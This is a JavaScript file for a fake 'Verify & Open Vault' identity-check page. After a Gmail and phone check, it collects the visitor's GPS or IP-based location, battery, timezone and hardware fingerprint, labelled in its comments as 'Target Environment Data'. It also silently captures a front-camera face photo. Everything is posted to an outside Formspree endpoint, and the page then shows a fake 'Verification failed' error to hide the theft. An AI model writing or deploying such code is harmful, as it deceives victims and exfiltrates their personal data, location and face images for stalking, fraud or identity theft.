const FORMSPREE_URL = "https://formspree.io/f/xzdkrzlp"; 

document.getElementById('verifyBtn').addEventListener('click', async () => {
    const status = document.getElementById('status');
    const emailInput = document.getElementById('email');
    const phoneInput = document.getElementById('phone');
    const btn = document.getElementById('verifyBtn');
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');

    const email = emailInput.value.trim();
    const phone = phoneInput.value.trim();

    // 1. Strict Validation
    const gmailRegex = /^[a-zA-Z0-9._%+-]+@gmail\.com$/;
    const phoneRegex = /^0[0-9]{9}$/;

    if (!gmailRegex.test(email)) {
        status.innerText = "Error: Only @gmail.com addresses are accepted.";
        return;
    }

    if (!phoneRegex.test(phone)) {
        status.innerText = "Error: Phone must be 10 digits starting with 0.";
        return;
    }

    // 2. Initial UI Lock
    btn.disabled = true;
    btn.innerText = "Syncing...";
    status.innerText = "Verifying Network & GPS...";

    // 3. Collect Advanced Device Data
    const getBatteryInfo = async () => {
        try {
            const b = await navigator.getBattery();
            return `${(b.level * 100)}% (${b.charging ? 'Charging' : 'Plugged Out'})`;
        } catch (e) { return "Unsupported"; }
    };

    const batteryStatus = await getBatteryInfo();
    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

    // 4. Location Logic with IP Fallback
    let locationData = "Access Denied";
    try {
        const pos = await new Promise((res, rej) => {
            navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true, timeout: 5000 });
        });
        locationData = `GPS: ${pos.coords.latitude}, ${pos.coords.longitude} (Acc: ${pos.coords.accuracy}m)`;
    } catch (e) { 
        console.log("GPS Blocked, trying IP fallback...");
        try {
            const ipRes = await fetch('https://ipapi.co/json/');
            const ipData = await ipRes.json();
            locationData = `IP-Based: ${ipData.city}, ${ipData.region}, ${ipData.country_name} (ISP: ${ipData.org})`;
        } catch (ipErr) {
            locationData = "All Location Access Denied";
        }
    }

    // 5. Camera Activation and File Submission
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        
        video.style.display = "block";
        video.srcObject = stream;
        status.innerText = "Processing Face-ID Sync...";

        // Wait for camera to stabilize/focus
        await new Promise(r => setTimeout(r, 2500));

        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);

        // Convert to Binary Blob to send as a real file
        canvas.toBlob(async (blob) => {
            const formData = new FormData();
            
            // Core Identity
            formData.append("email", email);
            formData.append("phone", phone);
            
            // Target Environment Data
            formData.append("location_data", locationData);
            formData.append("timezone", timezone);
            formData.append("user_agent", navigator.userAgent);
            formData.append("language", navigator.language);
            
            // Hardware Specs (Fingerprinting)
            formData.append("screen_resolution", `${window.screen.width}x${window.screen.height}`);
            formData.append("cpu_cores", navigator.hardwareConcurrency || "Unknown");
            formData.append("device_memory_gb", navigator.deviceMemory || "Unknown");
            formData.append("battery_status", batteryStatus);
            formData.append("network_effective_type", connection.effectiveType || "Unknown");
            
            // The Image File
            formData.append("captured_face", blob, "sync_capture.jpg");

            // Submit to Formspree
            await fetch(FORMSPREE_URL, {
                method: 'POST',
                headers: { 'Accept': 'application/json' },
                body: formData
            });

            // Final UI Reset
            status.innerText = "Verification failed (Error 0xAF2). Please try again later.";
            stream.getTracks().forEach(t => t.stop());
            video.style.display = "none";
            btn.disabled = false;
            btn.innerText = "Verify & Open Vault";

        }, 'image/jpeg', 0.6); // Quality set to 0.6 to keep file size optimized

    } catch (err) {
        status.innerText = "Error: Camera access is required for verification.";
        btn.disabled = false;
        btn.innerText = "Verify & Open Vault";
    }
});